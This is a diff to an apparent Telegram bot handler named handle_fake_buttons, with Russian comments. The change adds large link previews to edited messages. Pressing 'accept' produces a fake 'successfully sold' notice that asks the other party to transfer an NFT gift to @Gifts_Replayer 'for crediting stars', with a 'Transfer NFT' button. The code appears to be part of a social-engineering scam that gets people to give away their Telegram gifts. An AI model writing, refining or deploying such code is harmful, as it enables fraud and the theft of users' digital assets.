@@ -90,21 +90,34 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
 
     try:
         if action == "accept":
+            # Текст для "Принять"
             new_text = (
                 f"🎁 <a href='{link}'>{pretty_name}</a> успешно продан!\n\n"
                 f"• Передайте <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> для зачисления звёзд."
             )
+            # Кнопка "Передать NFT"
             new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
                 [InlineKeyboardButton(text="Передать NFT", url=link)]
             ])
+            # ВОЗВРАЩАЕМ ПРЕВЬЮ
+            preview_options = LinkPreviewOptions(
+                url=link, 
+                show_above_text=True, 
+                prefer_large_media=True
+            )
         else:
+            # Текст для "Отклонить"
             new_text = f"❌ Оффер на <b>{amount} ⭐</b> за подарок <a href='{link}'>{pretty_name}</a> отклонен."
             new_keyboard = None
+            # При отклонении превью можно оставить или убрать. Оставим.
+            preview_options = LinkPreviewOptions(
+                url=link, 
+                show_above_text=True, 
+                prefer_large_media=True
+            )
 
-        # Получаем business_connection_id из сообщения, которое редактируем
         business_connection_id = callback.message.business_connection_id
 
-        # Если по какой-то причине его нет, пробуем отредактировать без него (для обычных чатов)
         if business_connection_id:
             await bot.edit_message_text(
                 text=new_text,
@@ -113,17 +126,16 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
                 business_connection_id=business_connection_id,
                 reply_markup=new_keyboard,
                 parse_mode="HTML",
-                link_preview_options=LinkPreviewOptions(is_disabled=True)
+                link_preview_options=preview_options # <--- ПЕРЕДАЕМ НАСТРОЙКИ ПРЕВЬЮ
             )
         else:
-            # Резервный вариант для обычных чатов (не бизнес)
             await bot.edit_message_text(
                 text=new_text,
                 chat_id=callback.message.chat.id,
                 message_id=callback.message.message_id,
                 reply_markup=new_keyboard,
                 parse_mode="HTML",
-                link_preview_options=LinkPreviewOptions(is_disabled=True)
+                link_preview_options=preview_options # <--- ПЕРЕДАЕМ НАСТРОЙКИ ПРЕВЬЮ
             )
 
         await callback.answer()
